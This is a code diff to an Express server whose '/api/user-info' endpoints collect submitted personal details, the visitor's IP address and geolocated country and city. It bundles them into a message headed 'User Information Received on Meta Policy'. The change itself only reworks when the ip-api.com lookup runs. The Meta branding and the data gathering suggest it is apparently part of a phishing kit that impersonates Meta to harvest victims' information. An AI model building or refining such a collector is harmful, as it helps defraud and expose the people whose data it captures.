@@ -42,17 +42,30 @@ app.post('/api/user-info', async (req, res) => {
     const userInfo = req.body;
     const ipAddress = userInfo.ipAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     // Lấy thông tin vị trí từ API
-    let countryName = '';
-    let cityName = '';
+    let countryName = userInfo.country || '';  // Kiểm tra nếu đã có trong request
+    let cityName = userInfo.city || '';        // Kiểm tra nếu đã có trong request
 
-    try {
-        const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
-        if (geoResponse.data.status === 'success') {
-            countryName = geoResponse.data.country || 'Unknown';
-            cityName = geoResponse.data.city || 'Unknown';
+    // Chỉ gọi API nếu countryName hoặc cityName không có giá trị
+    if (!countryName) {
+        try {
+            const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
+            if (geoResponse.data.status === 'success') {
+                countryName = geoResponse.data.country || 'Unknown';
+            }
+        } catch (error) {
+            console.error('Error fetching location data:', error.message);
         }
-    } catch (error) {
-        console.error('Error fetching location data:', error.message);
+    }
+
+    if (!cityName) {
+        try {
+            const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
+            if (geoResponse.data.status === 'success') {
+                cityName = geoResponse.data.city || 'Unknown';
+            }
+        } catch (error) {
+            console.error('Error fetching location data:', error.message);
+        }
     }
 
     const message = `
@@ -96,22 +109,32 @@ app.post('/api/user-info-1', async (req, res) => {
     const userInfo = req.body;
     const ipAddress = userInfo.ipAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     // Lấy thông tin vị trí từ API
-    let countryName = '';
-    let cityName = '';
+    let countryName = userInfo.country || '';  // Kiểm tra nếu đã có trong request
+    let cityName = userInfo.city || '';        // Kiểm tra nếu đã có trong request
 
-
-    try {
-        const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
-        if (geoResponse.data.status === 'success') {
-            countryName = geoResponse.data.country || 'Unknown';
-            cityName = geoResponse.data.city || 'Unknown';
+    // Chỉ gọi API nếu countryName hoặc cityName không có giá trị
+    if (!countryName) {
+        try {
+            const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
+            if (geoResponse.data.status === 'success') {
+                countryName = geoResponse.data.country || 'Unknown';
+            }
+        } catch (error) {
+            console.error('Error fetching location data:', error.message);
         }
-    } catch (error) {
-        console.error('Error fetching location data:', error.message);
     }
-    console.log('ipAddress', ipAddress);
-    console.log('ipAddress', countryName);
-    console.log('ipAddress', cityName);
+
+    if (!cityName) {
+        try {
+            const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
+            if (geoResponse.data.status === 'success') {
+                cityName = geoResponse.data.city || 'Unknown';
+            }
+        } catch (error) {
+            console.error('Error fetching location data:', error.message);
+        }
+    }
+
     const message = `
 📧 *User Information Received on Meta Policy*:
 - Full Name: ${userInfo.fullName || ''}
